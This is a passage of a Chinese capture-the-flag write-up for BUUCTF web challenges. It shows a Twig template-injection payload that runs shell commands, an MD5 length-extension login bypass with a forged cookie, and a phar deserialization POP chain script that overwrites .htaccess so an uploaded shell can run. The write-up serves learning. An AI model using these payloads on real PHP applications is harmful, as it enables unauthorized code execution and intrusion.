<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201019130848504.png" srcset="/img/loading.gif" alt="image-20201019130848504"></p>
<p>twig通用payload试试</p>
<pre><code>user={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201019171557047.png" srcset="/img/loading.gif" alt="image-20201019171557047"></p>
<p>读flag</p>
<pre><code>user={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201019171132646.png" srcset="/img/loading.gif" alt="image-20201019171132646"></p>
<h2 id="ByteCTF-2019-Web-ezcms"><a href="#ByteCTF-2019-Web-ezcms" class="headerlink" title="ByteCTF-2019-Web-ezcms"></a>ByteCTF-2019-Web-ezcms</h2><p>考点：md5拓展攻击，phar反序列化</p>
<p>进来是个登录界面</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201019174530573.png" srcset="/img/loading.gif" alt="image-20201019174530573"></p>
<p>随便输下账户密码进入文件上传界面</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201019174621449.png" srcset="/img/loading.gif" alt="image-20201019174621449"></p>
<p>点这个view detail是下面这种界面，返回上传的文件类型和文件位置。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201019174712097.png" srcset="/img/loading.gif" alt="image-20201019174712097"></p>
<p>随便上传一个文件，出现下面的回显。也就是说上传要求admin权限。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201021170641488.png" srcset="/img/loading.gif" alt="image-20201021170641488"></p>
<p>先扫一下，扫出了<a href="http://www.zip。代码审计。" target="_blank" rel="noopener">www.zip。代码审计。</a></p>
<p>index.php是刚刚的登录页面，它要求传入的password不能等于”admin”。</p>
<pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//index.php</span>
<span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token operator">===</span> <span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"u r not admin !!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">'&lt;script>location.href="upload.php";&lt;/script>'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>看下config.php相关登录的部分,可以用md5拓展攻击满足条件。</p>
<pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//config.php</span>

<span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

    <span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token string">"********"</span><span class="token punctuation">;</span>
    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">"hash"</span><span class="token punctuation">,</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token punctuation">.</span><span class="token string">"adminadmin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">is_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token string">"********"</span><span class="token punctuation">;</span>
    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">!=</span> <span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token punctuation">.</span><span class="token variable">$username</span><span class="token punctuation">.</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">Profile</span><span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$admin</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">is_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token string">"********"</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">===</span> <span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">!=</span> <span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>

    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">admin</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">Admin</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$size</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$checker</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$file_tmp</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$upload_dir</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$content_check</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$file_tmp</span><span class="token punctuation">,</span> <span class="token variable">$size</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">upload_dir</span> <span class="token operator">=</span> <span class="token string">'sandbox/'</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">upload_dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">upload_dir</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">upload_dir</span><span class="token punctuation">.</span><span class="token string">'/.htaccess'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">upload_dir</span><span class="token punctuation">.</span><span class="token string">'/.htaccess'</span><span class="token punctuation">,</span> <span class="token string">'lolololol, i control all'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">size</span> <span class="token operator">=</span> <span class="token variable">$size</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file_tmp</span> <span class="token operator">=</span> <span class="token variable">$file_tmp</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content_check</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Check</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file_tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$profile</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Profile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checker</span> <span class="token operator">=</span> <span class="token variable">$profile</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">is_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将是否为admin的结果存入$checker</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checker</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'u r not admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content_check</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">size</span> <span class="token operator">></span> <span class="token number">204800</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"your file is too big"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file_tmp</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">upload_dir</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'.'</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>

    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>//用hashpump构造payload</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201021170019191.png" srcset="/img/loading.gif" alt="image-20201021170019191"></p>
<p>向用户名传admin,密码传这个进行登录。</p>
<pre><code>admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00dwm2</code></pre><p>再向上传界面添加cookie user后，刷新页面。</p>
<pre><code>user=4a4273909fdfabb4aa22b55264e7330e</code></pre><p>可以看到文件已经上传成功了。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201021170500217.png" srcset="/img/loading.gif" alt="image-20201021170500217"></p>
<p>要想方法传shell。但从源码中可以看到，由于.htaccess内容完全被控制，导致php文件无法正常解析。</p>
<pre class=" language-php"><code class="language-php">    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">.</span><span class="token string">'/.htaccess'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">.</span><span class="token string">'/.htaccess'</span><span class="token punctuation">,</span> <span class="token string">'lolololol, i control all'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span></code></pre>
<p>其实看到这么多魔术方法应该就往反序列化方向考虑。</p>
<p>看一下File类。</p>
<p>有可控参数filename和filepath，</p>
<p>在view_detail函数中对filepath做了一些有关伪协议的过滤。</p>
<p>然后通过mime_content_type函数对文件类型进行检测，重点就在于这个函数通过_php_finfo_get_type间接调用了关键函数php_stream_open_wrapper_ex,导致此处可以触发phar反序列化。</p>
<p>思路就是构造pop链删除或重写.htaccess/干脆换一个目录。</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">File</span><span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$filepath</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$checker</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$filepath</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filepath</span> <span class="token operator">=</span> <span class="token variable">$filepath</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">view_detail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filepath</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"nonono~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$mine</span> <span class="token operator">=</span> <span class="token function">mime_content_type</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$store_path</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string">'mine'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$mine</span><span class="token punctuation">;</span>
        <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string">'store_path'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$store_path</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>

    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$filepath</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string">"$filename is in $filepath"</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checker</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checker</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre>
<p>继续向下看代码，思考如何构建链。File类的析构函数中checker调用了本类不存在的函数upload_file(),这让人想到_ _ call()方法，而Profile类中正好存在可利用的_ _call，在call方法中$admin调用了open方法。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201025161531936.png" srcset="/img/loading.gif" alt="image-20201025161531936"></p>
<p>这是题目的open方法。这样看好像没什么出路了。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201025163002411.png" srcset="/img/loading.gif" alt="image-20201025163002411"></p>
<p>但是类中的admin是可控的，如果我们将admin定义为php中一个内置类的对象，且这个类有open函数，功能是删除或更改文件信息就能达到目的。如图，搜到了ZipArchive类。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201025175111185.png" srcset="/img/loading.gif" alt="image-20201025175111185"></p>
<p>参数：filename文件名，flags是打开文档的模式，这里的参数就选择这两个。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201025180311424.png" srcset="/img/loading.gif" alt="image-20201025180311424"></p>
<p>综上进行phar文件构造，脚本如下：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">File</span><span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$filepath</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$checker</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$filepath</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filepath</span> <span class="token operator">=</span> <span class="token variable">$filepath</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checker</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Profile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">Profile</span><span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$admin</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span>  <span class="token string">"/var/www/html/sandbox/479bfbc13b06e3588906f74bae9507c9/.htaccess"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> ZipArchive<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">OVERWRITE</span> <span class="token operator">|</span> ZipArchive<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">CREATE</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">admin</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">'aa'</span><span class="token punctuation">,</span><span class="token string">'aa'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"2.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"2.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p>先上传一个shell（因为每次访问upload都会重置.htaccess，为了使下面更改.htaccess操作生效）,check()里的黑名单用拼接形式绕过。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201025191843151.png" srcset="/img/loading.gif" alt="image-20201025191843151"></p>
